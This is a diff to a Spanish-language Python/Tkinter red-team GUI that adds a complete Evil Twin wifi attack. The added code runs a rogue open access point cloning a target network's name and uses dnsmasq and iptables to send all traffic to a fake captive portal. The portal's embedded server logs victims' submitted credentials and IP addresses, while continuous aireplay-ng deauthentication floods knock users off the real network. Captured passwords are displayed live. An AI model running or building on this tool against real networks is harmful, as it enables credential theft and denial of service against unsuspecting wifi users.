@@ -310,6 +310,253 @@ class MultiDeauthAttack:
         self.threads.clear()
         self.callback("[+] Ambos procesos de deauth detenidos.")
 
+class EvilTwinAttack:
+    """
+    Encapsula la lógica completa de un ataque Evil Twin:
+    - AP falso (hostapd)
+    - DHCP/DNS (dnsmasq)
+    - Servidor cautivo (capture.py)
+    - Desautenticación (aireplay-ng) simple o dual (usando MultiDeauthAttack)
+    - Limpieza y restauración de red.
+    """
+    def __init__(self, ap_iface, mon_ifaces, bssids, channels, essid, portal_name,
+                 client_macs, callback, session_dir):
+        self.ap_iface = ap_iface
+        self.mon_ifaces = mon_ifaces          # lista de ifaces monitor (1 o 2)
+        self.bssids = bssids
+        self.channels = channels
+        self.essid = essid
+        self.portal_name = portal_name
+        self.client_macs = client_macs        # lista, tamaño = len(bssids)
+        self.callback = callback
+        self.session_dir = session_dir
+        self.multi_deauth = None
+        self.single_deauth_proc = None
+        self.hostapd_proc = None
+        self.dnsmasq_proc = None
+        self.captive_proc = None
+        self.stop_flag = False
+        self.attack_thread = None
+        self.tmp_web = None
+
+    def start(self):
+        self.attack_thread = threading.Thread(target=self._attack, daemon=True)
+        self.attack_thread.start()
+
+    def _attack(self):
+        import shutil
+        portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
+        self.tmp_web = f"/tmp/evil_twin_web_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
+        os.makedirs(self.tmp_web, exist_ok=True)
+
+        # Copiar portal
+        try:
+            ruta_origen = os.path.join(portals_dir, self.portal_name)
+            shutil.copytree(ruta_origen, self.tmp_web, dirs_exist_ok=True)
+        except Exception as e:
+            self.callback(f"[!] Error copiando portal: {e}")
+
+        cred_log = os.path.abspath(os.path.join(self.session_dir, "credentials.log"))
+
+        # Script del servidor cautivo
+        capture_script = f'''#!/usr/bin/env python3
+import http.server, urllib.parse, os
+from datetime import datetime
+
+LOG = "{cred_log}"
+
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        parsed_path = urllib.parse.urlparse(self.path)
+        if parsed_path.query:
+            try:
+                params = urllib.parse.parse_qs(parsed_path.query)
+                with open(LOG, "a") as f:
+                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
+                    f.flush(); os.fsync(f.fileno())
+            except: pass
+        if parsed_path.path == "/":
+            self.path = "/index.html"
+        local_path = self.translate_path(self.path)
+        if not os.path.isfile(local_path):
+            if self.path == "/index.html":
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>Error de Servidor: El archivo index.html no existe.</h2></body></html>")
+                return
+            self.send_response(302)
+            self.send_header("Location", "http://10.0.0.1/index.html")
+            self.end_headers()
+            return
+        return super().do_GET()
+
+    def do_POST(self):
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+            data = self.rfile.read(length).decode("utf-8", "ignore")
+            params = urllib.parse.parse_qs(data)
+            with open(LOG, "a") as f:
+                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
+                f.flush(); os.fsync(f.fileno())
+        except: pass
+        self.send_response(302)
+        self.send_header("Location", "http://10.0.0.1/success.html")
+        self.end_headers()
+
+    def log_message(self, format, *args): pass
+
+if __name__ == "__main__":
+    os.chdir("{self.tmp_web}")
+    class ThreadedServer(http.server.ThreadingHTTPServer):
+        allow_reuse_address = True
+    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd:
+        httpd.serve_forever()
+'''
+        with open(f"{self.tmp_web}/capture.py", "w") as f:
+            f.write(capture_script)
+        if not os.path.exists(f"{self.tmp_web}/success.html"):
+            with open(f"{self.tmp_web}/success.html", "w") as f:
+                f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')
+
+        # Activar forwarding
+        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # hostapd
+        hostapd_conf = (f"interface={self.ap_iface}\ndriver=nl80211\nssid={self.essid}\n"
+                        f"hw_mode=g\nchannel={int(self.channels[0])}\nmacaddr_acl=0\n"
+                        f"auth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n")
+        with open("/tmp/hostapd_evil.conf", "w") as f:
+            f.write(hostapd_conf)
+        self.hostapd_proc = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
+                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(3)
+
+        # Configurar AP
+        subprocess.run(["sudo", "nmcli", "device", "set", self.ap_iface, "managed", "no"],
+                       stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "ip", "link", "set", self.ap_iface, "down"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "ip", "addr", "flush", "dev", self.ap_iface], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "ip", "link", "set", self.ap_iface, "up"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", self.ap_iface], stderr=subprocess.DEVNULL)
+        time.sleep(1.5)
+
+        # dnsmasq
+        dnsmasq_conf = (f"interface={self.ap_iface}\nexcept-interface=lo\nbind-interfaces\n"
+                        f"dhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\n"
+                        f"dhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n")
+        with open("/tmp/dnsmasq_evil.conf", "w") as f:
+            f.write(dnsmasq_conf)
+        subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
+        self.dnsmasq_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
+                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+
+        # iptables
+        subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp",
+                        "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"],
+                       stderr=subprocess.DEVNULL)
+        for port in ["80", "53"]:
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", self.ap_iface,
+                            "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+        for port in ["53", "67"]:
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", self.ap_iface,
+                            "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+
+        # Servidor cautivo
+        self.captive_proc = subprocess.Popen(["sudo", "python3", f"{self.tmp_web}/capture.py"],
+                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+
+        # Desautenticación
+        if len(self.mon_ifaces) == 2:
+            # Dual‑band
+            self.multi_deauth = MultiDeauthAttack(
+                mon_ifaces=self.mon_ifaces,
+                bssids=self.bssids,
+                channels=self.channels,
+                burst=0,   # continuo
+                callback=self.callback
+            )
+            self.multi_deauth.start()
+        else:
+            # Single‑band
+            mon_iface = self.mon_ifaces[0]
+            bssid = self.bssids[0]
+            ch = self.channels[0]
+            client_mac = self.client_macs[0]
+            subprocess.run(["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid]
+            if client_mac != "FF:FF:FF:FF:FF:FF":
+                cmd.extend(["-c", client_mac])
+            cmd.append(mon_iface)
+            self.single_deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                                       stderr=subprocess.DEVNULL)
+            self.callback(f"[*] Deauth single iniciado: {' '.join(cmd)}")
+
+        # Bucle de monitoreo de credenciales
+        last_lines = 0
+        while not self.stop_flag:
+            time.sleep(2)
+            if os.path.exists(cred_log):
+                with open(cred_log, "r") as f:
+                    lines = f.readlines()
+                    if len(lines) > last_lines:
+                        for line in lines[last_lines:]:
+                            self.callback(f"[+] Cred: {line.strip()}")
+                        last_lines = len(lines)
+
+        # Limpieza
+        self._cleanup()
+
+    def stop(self):
+        self.stop_flag = True
+        if self.attack_thread:
+            self.attack_thread.join(timeout=5)
+
+    def _cleanup(self):
+        # Terminar procesos
+        for proc in [self.hostapd_proc, self.dnsmasq_proc, self.captive_proc,
+                     self.single_deauth_proc]:
+            if proc:
+                try:
+                    proc.terminate()
+                    proc.wait(timeout=3)
+                except:
+                    proc.kill()
+        if self.multi_deauth:
+            self.multi_deauth.stop()
+
+        # Limpiar iptables
+        subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+        if self.ap_iface:
+            subprocess.run(["sudo", "ip", "link", "set", self.ap_iface, "down"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iw", "dev", self.ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", self.ap_iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "flush", "dev", self.ap_iface], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "nmcli", "device", "set", self.ap_iface, "managed", "yes"], stderr=subprocess.DEVNULL)
+
+        # Parar interfaces monitor
+        for mon in self.mon_ifaces:
+            if 'mon' in mon:
+                subprocess.run(["sudo", "airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # Limpiar temporales
+        if self.tmp_web:
+            try:
+                shutil.rmtree(self.tmp_web, ignore_errors=True)
+            except:
+                pass
+
+        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.callback("[+] Evil Twin detenido y red restaurada.")
 
 class TecladoNumerico(tk.Toplevel):
     def __init__(self, parent, variable_destino, titulo="Ingresar IP/Rango"):
@@ -1609,25 +1856,134 @@ class RedTeamApp(tk.Tk):
                     except:
                         pass
             
-            self.after(0, lambda: self._evil_twin_mostrar_redes(redes))
+            self.after(0, lambda: self._evil_twin_mostrar_redes_clasificadas(redes))
 
         threading.Thread(target=escanear, daemon=True).start()
 
-    def _evil_twin_mostrar_redes(self, redes):
+    def _evil_twin_mostrar_redes_clasificadas(self, redes):
         self.limpiar_main_frame()
+        # CAMBIO: volver al menú Evil Twin, no a _evil_twin_select_deauth
         self.agregar_boton_atras(self._wifi_evil_twin)
         ttk.Label(self.main_frame, text="RED OBJETIVO", style='Title.TLabel').pack(pady=2)
         if not redes:
             ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
             return
-        scroll = ScrollableFrame(self.main_frame, max_items=50)
+
+        # Agrupar por ESSID (case-insensitive)
+        groups = {}
+        for r in redes:
+            key = r['essid'].lower()
+            groups.setdefault(key, []).append(r)
+
+        dual_pairs = []
+        singles = []
+        used = set()
+        for items in groups.values():
+            # Buscar combinaciones de canales distintos dentro del mismo ESSID
+            for i in range(len(items)):
+                for j in range(i+1, len(items)):
+                    if items[i]['ch'] != items[j]['ch']:
+                        dual_pairs.append((items[i], items[j]))
+                        used.add(items[i]['bssid'])
+                        used.add(items[j]['bssid'])
+            # Las redes no emparejadas van a singles
+            for item in items:
+                if item['bssid'] not in used:
+                    singles.append(item)
+
+        scroll = ScrollableFrame(self.main_frame, max_items=80)
         scroll.pack(fill='both', expand=True, padx=5, pady=2)
-        for red in redes:
-            texto = f"{red['essid']} (CH:{red['ch']})"
-            scroll.add_button(text=texto, command=lambda r=red: self._evil_twin_seleccionar_portal(r),
-                              style='Gray.TButton', width=28)
+
+        if dual_pairs:
+            ttk.Label(scroll.scrollable_frame, text="── Redes dual‑band detectadas ──",
+                      style='Mono.TLabel', foreground=COLOR_TEXTO_EXITO).pack(anchor='w', padx=5, pady=(5,2))
+            for red1, red2 in dual_pairs:
+                texto = f"{red1['essid']}  (CH{red1['ch']} + CH{red2['ch']})"
+                btn = ttk.Button(scroll.scrollable_frame, text=texto, style='Gray.TButton',
+                                 command=lambda r1=red1, r2=red2: self._evil_twin_select_dual_target(r1, r2))
+                btn.pack(fill='x', padx=10, pady=3)
+
+        if singles:
+            ttk.Label(scroll.scrollable_frame, text="── Otras redes disponibles ──",
+                      style='Mono.TLabel', foreground=COLOR_TEXTO_SECUNDARIO).pack(anchor='w', padx=5, pady=(8,2))
+            for red in singles:
+                texto = f"{red['essid']}  (CH{red['ch']})"
+                btn = ttk.Button(scroll.scrollable_frame, text=texto, style='Gray.TButton',
+                                 command=lambda r=red: self._evil_twin_select_single_target(r))
+                btn.pack(fill='x', padx=10, pady=2)
+
         self.mostrar_consola(parent=scroll.scrollable_frame)
         gc.collect()
+
+
+    def _evil_twin_select_single_target(self, red):
+        self.wifi_state["evil_twin_type"] = "single"
+        self.wifi_state["target"] = red
+        self._evil_twin_seleccionar_portal()
+
+    def _evil_twin_select_dual_target(self, red1, red2):
+        self.wifi_state["evil_twin_type"] = "dual"
+        self.wifi_state["dual_targets"] = [red1, red2]
+        self._evil_twin_seleccionar_interfaz_deauth_dual()
+
+    def _evil_twin_seleccionar_interfaz_deauth_dual(self):
+        ap_iface = self.wifi_state["ap_iface"]
+        deauth_iface = self.wifi_state.get("deauth_iface")
+        interfaces = self.obtener_interfaces_red()
+        available = [i for i in interfaces if i != ap_iface and i != deauth_iface]
+
+        if not available:
+            self.escribir_consola("[!] No hay tercera interfaz. Se necesitan 3 interfaces físicas para ataque dual.")
+            self.limpiar_main_frame()
+            self.agregar_boton_atras(self._evil_twin_mostrar_redes_clasificadas)
+            ttk.Label(self.main_frame, text="ERROR: Se requiere una 3ra interfaz",
+                      style='Title.TLabel', foreground=COLOR_TEXTO_TERMINAL).pack(pady=10)
+            return
+
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self._evil_twin_mostrar_redes_clasificadas)
+        ttk.Label(self.main_frame, text="3ra INTERFAZ (DEAUTH 2)", style='Title.TLabel').pack(pady=2)
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+        for iface in available:
+            scroll.add_button(text=iface, command=lambda i=iface: self._evil_twin_set_third_iface(i),
+                              style='Red.TButton', width=28)
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+    def _evil_twin_set_third_iface(self, iface):
+        self.wifi_state["deauth_iface2"] = iface
+        self.escribir_consola(f"[*] Tercera interfaz para deauth: {iface}")
+        self._evil_twin_seleccionar_portal()
+
+    def _evil_twin_seleccionar_deauth_mode(self, portal):
+        self.wifi_state["portal_name"] = portal
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_portal())
+        ttk.Label(self.main_frame, text="MODO DEAUTH", style='Title.TLabel').pack(pady=2)
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+
+        if self.wifi_state.get("evil_twin_type") == "dual":
+            scroll.add_button(
+                text="Broadcast (ambas bandas)",
+                command=lambda: self._evil_twin_start_attack(portal, ["FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF"]),
+                style='Danger.TButton', width=28)
+            scroll.add_button(
+                text="Dirigido (escanear clientes)",
+                command=lambda: self._evil_twin_escanear_clientes_dual(portal),
+                style='Red.TButton', width=28)
+        else:
+            red = self.wifi_state["target"]
+            scroll.add_button(
+                text="Broadcast",
+                command=lambda: self._evil_twin_start_attack(portal, ["FF:FF:FF:FF:FF:FF"]),
+                style='Danger.TButton', width=28)
+            scroll.add_button(
+                text="Dirigido",
+                command=lambda: self._evil_twin_escanear_clientes(red, portal),
+                style='Red.TButton', width=28)
+
+        self.mostrar_consola(parent=scroll.scrollable_frame)
 
     def _evil_twin_seleccionar_portal(self, red):
         self.wifi_state["target"] = red
@@ -1666,9 +2022,182 @@ class RedTeamApp(tk.Tk):
         self.mostrar_consola(parent=scroll.scrollable_frame)
 
 
-    def _evil_twin_escanear_clientes(self, red, portal):
+    def _evil_twin_escanear_clientes_dual(self, portal):
         self.limpiar_main_frame()
-        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
+        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(portal))
+        ttk.Label(self.main_frame, text="ESCANEANDO CLIENTES DUAL", style='Title.TLabel').pack(pady=2)
+        self.mostrar_consola()
+        self.escribir_consola("[*] Rastreando clientes en ambas bandas (10s)...")
+
+        red1, red2 = self.wifi_state["dual_targets"]
+
+        def escanear():
+            # Preparar segundo monitor si es necesario
+            mon1 = self.wifi_state.get("mon_deauth")  # ya existe del escaneo previo
+            deauth_iface2 = self.wifi_state.get("deauth_iface2")
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", deauth_iface2], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            mon2 = f"{deauth_iface2}mon" if os.path.exists(f"/sys/class/net/{deauth_iface2}mon") else deauth_iface2
+            self.wifi_state["mon_deauth2"] = mon2
+
+            def scan_band(red, mon, prefix):
+                subprocess.run(["sudo", "iw", "dev", mon, "set", "channel", str(red['ch'])],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(
+                    f"sudo timeout -k 5 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {prefix} --output-format csv",
+                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                clients = []
+                try:
+                    with open(f"{prefix}-01.csv", "r", errors="ignore") as f:
+                        partes = f.read().split("Station MAC,")
+                        if len(partes) > 1:
+                            for linea in partes[1].split("\n")[1:]:
+                                c = linea.split(",")
+                                if len(c) >= 6 and ":" in c[0]:
+                                    clients.append(c[0].strip())
+                except:
+                    pass
+                finally:
+                    for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                        try: os.remove(f"{prefix}{ext}")
+                        except: pass
+                return clients
+
+            prefix1 = self._generar_nombre_temporal("evil_dual_client1")
+            prefix2 = self._generar_nombre_temporal("evil_dual_client2")
+            import concurrent.futures
+            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+                f1 = executor.submit(scan_band, red1, mon1, prefix1)
+                f2 = executor.submit(scan_band, red2, mon2, prefix2)
+                clients1 = f1.result()
+                clients2 = f2.result()
+
+            self.after(0, lambda: self._evil_twin_mostrar_clientes_dual(clients1, clients2, red1, red2, portal))
+
+        threading.Thread(target=escanear, daemon=True).start()
+
+    def _evil_twin_mostrar_clientes_dual(self, clients1, clients2, red1, red2, portal):
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(portal))
+        ttk.Label(self.main_frame, text="CLIENTES POR BANDA", style='Title.TLabel').pack(pady=2)
+        scroll = ScrollableFrame(self.main_frame, max_items=50)
+        scroll.pack(fill='both', expand=True, padx=5, pady=2)
+
+        self.wifi_state["dual_client_selection"] = [None, None]
+        self.wifi_state["dual_client_labels"] = []
+
+        def make_callback(band_idx, mac):
+            self.wifi_state["dual_client_selection"][band_idx] = mac
+            self.wifi_state["dual_client_labels"][band_idx].config(text=f"Banda{band_idx+1}: {mac}")
+
+        # Banda 1
+        ttk.Label(scroll.scrollable_frame, text=f"Banda 1: {red1['essid']} (CH{red1['ch']})",
+                  style='Mono.TLabel').pack(anchor='w', padx=5, pady=(5,2))
+        lbl1 = ttk.Label(scroll.scrollable_frame, text="Selección: ---", style='Gray.TLabel')
+        lbl1.pack(anchor='w', padx=5)
+        self.wifi_state["dual_client_labels"].append(lbl1)
+        ttk.Button(scroll.scrollable_frame, text="Broadcast (FF:FF:FF:FF:FF:FF)",
+                   command=lambda: make_callback(0, "FF:FF:FF:FF:FF:FF"),
+                   style='Danger.TButton').pack(fill='x', padx=10, pady=1)
+        for mac in clients1:
+            ttk.Button(scroll.scrollable_frame, text=mac,
+                       command=lambda m=mac: make_callback(0, m),
+                       style='Gray.TButton').pack(fill='x', padx=10, pady=1)
+
+        # Banda 2
+        ttk.Label(scroll.scrollable_frame, text=f"Banda 2: {red2['essid']} (CH{red2['ch']})",
+                  style='Mono.TLabel').pack(anchor='w', padx=5, pady=(10,2))
+        lbl2 = ttk.Label(scroll.scrollable_frame, text="Selección: ---", style='Gray.TLabel')
+        lbl2.pack(anchor='w', padx=5)
+        self.wifi_state["dual_client_labels"].append(lbl2)
+        ttk.Button(scroll.scrollable_frame, text="Broadcast (FF:FF:FF:FF:FF:FF)",
+                   command=lambda: make_callback(1, "FF:FF:FF:FF:FF:FF"),
+                   style='Danger.TButton').pack(fill='x', padx=10, pady=1)
+        for mac in clients2:
+            ttk.Button(scroll.scrollable_frame, text=mac,
+                       command=lambda m=mac: make_callback(1, m),
+                       style='Gray.TButton').pack(fill='x', padx=10, pady=1)
+
+        def iniciar():
+            sel = self.wifi_state["dual_client_selection"]
+            if None in sel:
+                self.escribir_consola("[!] Seleccione un cliente (o broadcast) para cada banda.")
+                return
+            self._evil_twin_start_attack(portal, sel)
+
+        ttk.Button(scroll.scrollable_frame, text="INICIAR ATAQUE", command=iniciar,
+                   style='Red.TButton').pack(pady=10, fill='x', padx=20)
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+    def _evil_twin_start_attack(self, portal, client_macs):
+        evil_type = self.wifi_state.get("evil_twin_type")
+        if evil_type == "dual":
+            targets = self.wifi_state["dual_targets"]
+            bssids = [t['bssid'] for t in targets]
+            channels = [t['ch'] for t in targets]
+            essid = targets[0]['essid']
+            ap_iface = self.wifi_state["ap_iface"]
+            mon1 = self.wifi_state.get("mon_deauth")
+            mon2 = self.wifi_state.get("mon_deauth2")
+            if not mon2:
+                deauth_iface2 = self.wifi_state.get("deauth_iface2")
+                subprocess.run(["sudo", "airmon-ng", "start", deauth_iface2],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                mon2 = f"{deauth_iface2}mon" if os.path.exists(f"/sys/class/net/{deauth_iface2}mon") else deauth_iface2
+                self.wifi_state["mon_deauth2"] = mon2
+            mon_ifaces = [mon1, mon2]
+        else:  # single
+            target = self.wifi_state["target"]
+            bssids = [target['bssid']]
+            channels = [target['ch']]
+            essid = target['essid']
+            ap_iface = self.wifi_state["ap_iface"]
+            mon1 = self.wifi_state.get("mon_deauth")
+            mon_ifaces = [mon1]
+
+        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
+        os.makedirs(session_dir, exist_ok=True)
+
+        self.evil_twin_attack_instance = EvilTwinAttack(
+            ap_iface=ap_iface,
+            mon_ifaces=mon_ifaces,
+            bssids=bssids,
+            channels=channels,
+            essid=essid,
+            portal_name=portal,
+            client_macs=client_macs,
+            callback=self.escribir_consola,
+            session_dir=session_dir
+        )
+
+        # Pantalla de ataque activo
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(self.show_wifi_menu)
+        ttk.Label(self.main_frame, text="EVIL TWIN ACTIVO", style='Title.TLabel').pack(pady=2)
+        scroll = ScrollableFrame(self.main_frame, max_items=10)
+        scroll.pack(fill='both', expand=True, padx=2, pady=2)
+        self.btn_detener_evil = scroll.add_button(
+            text="DETENER ATAQUE", command=self._evil_twin_detener_click,
+            style='Danger.TButton', width=28)
+        self.mostrar_consola(parent=scroll.scrollable_frame)
+
+        self.evil_twin_attack_instance.start()
+
+    def _evil_twin_detener_click(self):
+        if hasattr(self, 'btn_detener_evil') and self.btn_detener_evil.winfo_exists():
+            self.btn_detener_evil.config(style='Gray.TButton')
+            self.btn_detener_evil.state(['disabled'])
+        self.escribir_consola("[*] Deteniendo Evil Twin...")
+        if hasattr(self, 'evil_twin_attack_instance'):
+            self.evil_twin_attack_instance.stop()
+        self.after(500, self.show_wifi_menu)
+
+    def _evil_twin_escanear_clientes(self, red, portal):
+        self.wifi_state["target"] = red
+        self.wifi_state["evil_twin_type"] = "single"
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(portal))
         ttk.Label(self.main_frame, text=f"BUSCANDO VÍCTIMAS\n{red['essid']}", style='Title.TLabel', justify='center').pack(pady=10)
         self.mostrar_consola()
         self.escribir_consola("[*] Rastreando clientes objetivos (10s)...")
@@ -1676,11 +2205,9 @@ class RedTeamApp(tk.Tk):
         def escanear():
             mon = self.wifi_state.get("mon_deauth")
             scan_prefix = self._generar_nombre_temporal("evil_clients")
-            
             subprocess.run(
                 f"sudo timeout -k 5 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
                 shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
             clientes = []
             try:
                 with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
@@ -1688,7 +2215,7 @@ class RedTeamApp(tk.Tk):
                     if len(partes) > 1:
                         for linea in partes[1].split("\n")[1:]:
                             c = linea.split(",")
-                            if len(c) >= 6 and ":" in c[0]: 
+                            if len(c) >= 6 and ":" in c[0]:
                                 clientes.append(c[0].strip())
             except:
                 pass
@@ -1699,240 +2226,20 @@ class RedTeamApp(tk.Tk):
 
             def actualizar_gui():
                 self.limpiar_main_frame()
-                self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
+                self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(portal))
                 ttk.Label(self.main_frame, text="SELECCIONAR MAC", style='Title.TLabel').pack(pady=2)
-                
                 scroll = ScrollableFrame(self.main_frame, max_items=50)
                 scroll.pack(fill='both', expand=True, padx=5, pady=2)
-                
                 for mac in clientes:
                     scroll.add_button(text=mac,
-                                      command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m),
+                                      command=lambda m=mac: self._evil_twin_start_attack(portal, [m]),
                                       style='Gray.TButton', width=28)
                 self.mostrar_consola(parent=scroll.scrollable_frame)
-                import gc; gc.collect()
-            
+                gc.collect()
+
             self.after(0, actualizar_gui)
 
         threading.Thread(target=escanear, daemon=True).start()
-
-    def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
-        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-        session_dir = os.path.abspath(os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}"))
-        os.makedirs(session_dir, exist_ok=True)
-
-        self.limpiar_main_frame()
-        self.agregar_boton_atras(self.show_wifi_menu)
-        ttk.Label(self.main_frame, text="EVIL TWIN ACTIVO", style='Title.TLabel').pack(pady=2)
-        
-        scroll = ScrollableFrame(self.main_frame, max_items=10)
-        scroll.pack(fill='both', expand=True, padx=2, pady=2)
-        
-        # NUEVO BOTÓN
-        self.btn_detener_evil = scroll.add_button(text="DETENER ATAQUE", command=self._evil_twin_detener_click,
-                          style='Danger.TButton', width=28)
-                          
-        self.mostrar_consola(parent=scroll.scrollable_frame)
-
-        self.evil_twin_stop = False
-
-        def ataque():
-            import shutil
-            self._evil_twin_limpiar_procesos()
-            ap_iface = self.wifi_state["ap_iface"]
-            deauth_iface = self.wifi_state.get("deauth_iface")
-            mon_deauth = self.wifi_state.get("mon_deauth")
-
-            if not mon_deauth:
-                subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL,
-                               stderr=subprocess.DEVNULL)
-                mon_deauth = f"{deauth_iface}mon" if os.path.exists(
-                    f"/sys/class/net/{deauth_iface}mon") else deauth_iface
-                self.wifi_state["mon_deauth"] = mon_deauth
-
-            # 1. Copia segura nativa de Python (Evita fallos silenciosos de Bash)
-            portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
-            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
-            os.makedirs(tmp_web, exist_ok=True)
-            
-            try:
-                ruta_origen = os.path.join(portals_dir, portal)
-                # Copia todo el contenido de la carpeta del portal a la carpeta temporal
-                shutil.copytree(ruta_origen, tmp_web, dirs_exist_ok=True)
-            except Exception as e:
-                self.escribir_consola(f"[!] Aviso al copiar archivos: {e}")
-
-            cred_log = os.path.abspath(os.path.join(session_dir, "credentials.log"))
-            
-            # 2. Servidor Web Multihilo y Blindado contra Bucles
-            capture_script = f'''#!/usr/bin/env python3
-import http.server, urllib.parse, os
-from datetime import datetime
-
-LOG = "{cred_log}"
-
-class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        parsed_path = urllib.parse.urlparse(self.path)
-        
-        # Captura por URL (GET) si es que el portal lo envía así
-        if parsed_path.query:
-            try:
-                params = urllib.parse.parse_qs(parsed_path.query)
-                with open(LOG, "a") as f: 
-                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
-                    f.flush(); os.fsync(f.fileno())
-            except: pass
-
-        # Interpretar la raíz "/" como "/index.html"
-        if parsed_path.path == "/":
